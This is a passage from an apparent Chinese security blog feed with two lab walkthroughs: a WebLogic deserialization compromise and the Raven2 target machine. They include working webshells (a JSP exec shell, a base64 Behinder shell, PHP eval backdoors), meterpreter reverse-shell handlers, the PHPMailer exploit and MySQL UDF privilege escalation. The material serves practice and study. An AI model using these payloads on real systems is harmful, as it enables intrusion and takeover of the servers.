class="line">\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war</span><br></pre></td></tr></table></figure><p>写进去，注意这里面<code>^</code>为转义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c &#x27;echo ^&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%^&gt; &gt; .\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell.jsp&#x27;</span><br></pre></td></tr></table></figure><p>然而不行，呵呵呵呵</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/image-20230705152442230.png" alt="image-20230705152442230" /></p><p>这个漏洞在<a href="http://10.131.210.32:7001/uddiexplorer/SearchPublicRegistries.jsp%E8%BF%99%E9%87%8C%EF%BC%8C%E8%BF%99%E9%87%8C%E9%9D%A2%E7%9A%84operator%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%EF%BC%9A">http://10.131.210.32:7001/uddiexplorer/SearchPublicRegistries.jsp这里，这里面的operator我们可以利用：</a></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/image-20230705153152705.png" alt="image-20230705153152705" /></p><p>那么直接在msf上使用这个漏洞返回shell也不行，没返回session。尝试 base64 / hex 传一个冰蝎马吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c <span class="string">&#x27;echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7Lyror6Xlr4bpkqXkuLrov57mjqXlr4bnoIEzMuS9jW1kNeWAvOeahOWJjTE25L2N77yM6buY6K6k6L+e5o6l5a+G56CBcmViZXlvbmQqL3Nlc3Npb24ucHV0VmFsdWUoInUiLGspO0NpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KDIsbmV3IFNlY3JldEtleVNwZWMoay5nZXRCeXRlcygpLCJBRVMiKSk7bmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7fSU+ &gt; .\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell_b.jsp&#x27;</span></span><br><span class="line"></span><br><span class="line">python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c <span class="string">&#x27;certutil -f -decode C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell_b.jsp C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell_be.jsp&#x27;</span></span><br></pre></td></tr></table></figure><p>管用！连上了。</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/image-20230706154311007.png" alt="image-20230706154311007" /></p><p>多种方式进行会话维持</p><h2 id="冰蝎meterpreter连"><a class="markdownIt-Anchor" href="#冰蝎meterpreter连"></a> 冰蝎meterpreter连</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; set payload java/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; java/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 10.131.210.172</span><br><span class="line">lhost =&gt; 10.131.210.172</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 4445</span><br><span class="line">lport =&gt; 4445</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.131.210.172:4445 </span><br><span class="line">[*] Sending stage (58829 bytes) to 10.131.210.32</span><br><span class="line">[*] Meterpreter session 3 opened (10.131.210.172:4445 -&gt; 10.131.210.32:49950) at 2023-07-06 16:08:07 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>好吧，找另外一个漏洞：</p><blockquote><p>检查Payload：Weblogic10 HttpEchoShell1<br />[+]存在：CVE_2017_10271_ECHO漏洞，返回信息：de1ay\administrator</p></blockquote><p>上传冰蝎马，然后上传msf的木马反弹shell，然后上线cs，冲！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础环境设置&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础环境设置&quot;&gt;&lt;/a&gt; 基础环境设置&lt;/h1&gt;
&lt;h2 id=&quot;主要练习&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#主要练习&quot;&gt;&lt;/a&gt; 主要</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>打靶-Raven2</title>
    <link href="https://j3f5.github.io/articles/2023/06/28/%E6%89%93%E9%9D%B6-Raven2/"/>
    <id>https://j3f5.github.io/articles/2023/06/28/%E6%89%93%E9%9D%B6-Raven2/</id>
    <published>2023-06-28T02:07:36.000Z</published>
    <updated>2023-06-28T02:07:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="资产搜索信息搜集"><a class="markdownIt-Anchor" href="#资产搜索信息搜集"></a> 资产搜索&amp;信息搜集</h1><p>先用Masscan，扫一下，因为知道有网页，所以直接指定端口了，很快就有结果了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~]</span><br><span class="line">└─$ sudo masscan 10.131.210.0/24 --ports 80</span><br><span class="line">[sudo] password for j3fffff: </span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-06-26 04:30:34 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 256 hosts [1 port/host]</span><br><span class="line">Discovered open port 80/tcp on 10.131.210.39 这个才是</span><br><span class="line">Discovered open port 80/tcp on 10.131.210.134 这个是Canon打印机     </span><br><span class="line">Discovered open port 80/tcp on 10.131.210.9 H3Cwifi</span><br><span class="line">Discovered open port 80/tcp on 10.131.210.1                       </span><br><span class="line">Discovered open port 80/tcp on 10.131.210.59              </span><br><span class="line">Discovered open port 80/tcp on 10.131.210.65 访问不了</span><br></pre></td></tr></table></figure><p>找到机器了，那么就访问网页，发现是这样的：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628133330474.png" alt="image-20230628133330474" /></p><p>还是用nmap扫一下，是linux系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -A -p- 10.131.210.39 </span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 2681c1f35e01ef93493d911eae8b3cfc (DSA)</span><br><span class="line">|   2048 315801194da280a6b90d40981c97aa53 (RSA)</span><br><span class="line">|   256 1f773119deb0e16dca77077684d3a9a0 (ECDSA)</span><br><span class="line">|_  256 0e8571a8a2c308699c91c03f8418dfae (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-title: Raven Security</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          37669/udp6  status</span><br><span class="line">|   100024  1          44486/udp   status</span><br><span class="line">|   100024  1          51551/tcp   status</span><br><span class="line">|_  100024  1          52741/tcp6  status</span><br><span class="line">51551/tcp open  status  1 (RPC #100024)</span><br></pre></td></tr></table></figure><p>使用burp抓包，随便点一下，发现一些URL：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628133849371.png" alt="image-20230628133849371" /></p><p>不够，再用dirb扫一下，发现目录：<code>vendor</code></p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628134010281.png" alt="image-20230628134010281" /></p><p>分别打开，<code>PATH</code>，内容有网站的目录以及一个flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/vendor/</span><br><span class="line">flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</span><br></pre></td></tr></table></figure><p>再打开：<code>SECURITY、VERSION</code>，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## Version 5.2.17 (December 9th 2016)</span><br><span class="line">* This is officially the last feature release of 5.2. Security fixes only from now on; use PHPMailer 6.0!</span><br><span class="line"></span><br><span class="line">PHPMailer versions prior to 5.2.18 (released December 2016) are vulnerable to [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com).</span><br></pre></td></tr></table></figure><p>发现phpmail漏洞，上面有wordpress，使用wpscan扫一下，发现了upload目录，其他的好像没啥用：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628134946810.png" alt="image-20230628134946810" /></p><h1 id="phpmail漏洞rce-getshell"><a class="markdownIt-Anchor" href="#phpmail漏洞rce-getshell"></a> PHPMAIL漏洞RCE-getshell</h1><p>去找存在Phpmail的页面，一般存在于mail联系等，所以就是contact.php了。</p><p>发现使用这个<a href="https://github.com/opsxcq/exploit-CVE-2016-10033">exp</a>没办法成功，所以换一个exp：<a href="https://www.exploit-db.com/download/40974">40974.py</a></p><p>更改一些配置，例如攻击的页面等，然后执行脚本，访问contact.php，再访问shell.php</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628100744698.png" alt="image-20230628100744698" /></p><p>弄好了就直接打</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628135427514.png" alt="image-20230628135427514" /></p><p>访问一下<code>contact.php</code>，他就生成shell，在msf开个监听，然后打开<code>10.131.210.39/shell.php</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 post(multi/manage/shell_to_meterpreter) &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line">...</span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br></pre></td></tr></table></figure><p>设置一下LHOST即可，可以自己设置payload，现在用不到，等着返回，就可以拿到了shell，然后引入meterpreter进行后渗透</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use post/multi/manage/shell_to_meterpreter</span><br><span class="line">session 1</span><br></pre></td></tr></table></figure><p>成功，可以进行后渗透</p><h1 id="渗透提权"><a class="markdownIt-Anchor" href="#渗透提权"></a> 渗透提权</h1><p>先进行信息搜集，<a href="http://xn--LinEnum-fw3kw4f.sh">上传LinEnum.sh</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter# upload LinuEnum.sh /var/www/html/LinuEnum.sh</span><br></pre></td></tr></table></figure><p>扫一下，将至重定向到一个文件，看文件，发现存在Mysql：<code>mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3</code>，好了，应该可以用它来提权，得先知道他的用户名密码，所以一顿查找：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /var/www -name *config*</span><br><span class="line">/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php</span><br><span class="line">/var/www/html/wordpress/wp-admin/setup-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config-sample.php</span><br></pre></td></tr></table></figure><p>找到了，在<code>/var/www/html/wordpress/wp-config.php</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/** MySQL database username */</span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);</span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);</span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);</span><br></pre></td></tr></table></figure><p>用msf链接数据库，使用UDF提权试试看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Enter password: R@v3nSecurity</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+-----------+</span><br><span class="line">| @@basedir |</span><br><span class="line">+-----------+</span><br><span class="line">| /usr      |</span><br><span class="line">+-----------+</span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line">+-----------------+</span><br><span class="line">| @@version       |</span><br><span class="line">+-----------------+</span><br><span class="line">| 5.5.60-0+deb8u1 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p>下载UDF，编译一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/1518</span><br><span class="line">mv 1518 raptor_udf.c</span><br><span class="line">gcc -g -c raptor_udf.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so raptor_udf.o -</span><br><span class="line">mv raptor_udf.so udf.so</span><br></pre></td></tr></table></figure><p>操作！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">create table ha4k(line blob);</span><br><span class="line">insert into ha4k values(load_file(&#x27;/var/www/html/udf.so&#x27;));</span><br><span class="line"># 输出恶意so</span><br><span class="line">select * from ha4k into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line"># 创建函数</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">&lt;mod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure><p>全部都OK，后面查找特权命令：<code>find / -user root -perm 4000 -print 2 &gt; /dev/null</code></p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628124849070.png" alt="image-20230628124849070" /></p><p>OKOK，提权成功！</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628125028105.png" alt="image-20230628125028105" /></p><p>全局找Flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># find / -name flag*</span><br><span class="line">/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png</span><br><span class="line">/var/www/flag2.txt</span><br><span class="line">/root/flag4.txt</span><br><span class="line"># cat /root/flag4.txt</span><br></pre></td></tr></table></figure><h1 id="备注"><a class="markdownIt-Anchor" href="#备注"></a> 备注</h1><h2 id="命令行写shell出错"><a class="markdownIt-Anchor" href="#命令行写shell出错"></a> 命令行写shell出错</h2><p>他是反弹shell，所以开启：<code>nc -lvp 4444</code>，接受到了，尝试写一个一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_GET[&#x27;X&#x27;]);?&gt;&quot; &gt; bdoor.php</span><br></pre></td></tr></table></figure><p>发现了一些错误：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628101840177.png" alt="image-20230628101840177" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#x27;&lt;?php eval($_GET[&#x27;Jeff&#x27;]);?&gt;&#x27; &gt; bdoor.php</span><br><span class="line">$ cat bdoor.php</span><br><span class="line">&lt;?php eval($_GET[Jeff]);?&gt;</span><br><span class="line">$ echo &#x27;&lt;?php eval($_GET[\&#x27;Jeff\&#x27;]);?&gt;&#x27; &gt; bdoor.php     </span><br><span class="line">/bin/sh: 5: Syntax error: &quot;)&quot; unexpected</span><br><span class="line">$ echo &quot;&lt;?php eval($_GET[&#x27;X&#x27;]);?&gt;&quot; &gt; bdoor.php</span><br><span class="line">$ cat bdoor.php</span><br><span class="line">&lt;?php eval([&#x27;X&#x27;]);?&gt;</span><br><span class="line">$ echo &#x27;&lt;?php @eval($_POST[\&#x27;h4ck\&#x27;]) ?&gt;&#x27; &gt; bdoor.php</span><br><span class="line">/bin/sh: 7: Syntax error: &quot;)&quot; unexpected</span><br><span class="line">$ cat bdoor.php </span><br><span class="line">&lt;?php eval([&#x27;X&#x27;]);?&gt;</span><br><span class="line">$ echo &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; &gt;1.php</span><br><span class="line">$ cat 1.php</span><br><span class="line">&lt;?php eval($_POST[x]);?&gt;</span><br></pre></td></tr></table></figure><p>需要转义</p><h2 id="小彩蛋"><a class="markdownIt-Anchor" href="#小彩蛋"></a> 小彩蛋</h2><p>发现里面有contact.zip，可以下下来，自己看看里面有啥，这也是思路</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;资产搜索信息搜集&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#资产搜索信息搜集&quot;&gt;&lt;/a&gt; 资产搜索&amp;amp;信息搜集&lt;/h1&gt;
&lt;p&gt;先用Masscan，扫一下，因为知道有网页，所以直接指定端口了，很快就有结果了：&lt;/p&gt;
&lt;fig</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="打靶" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="权限提升" scheme="https://j3f5.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="漏洞扫描" scheme="https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
</feed>
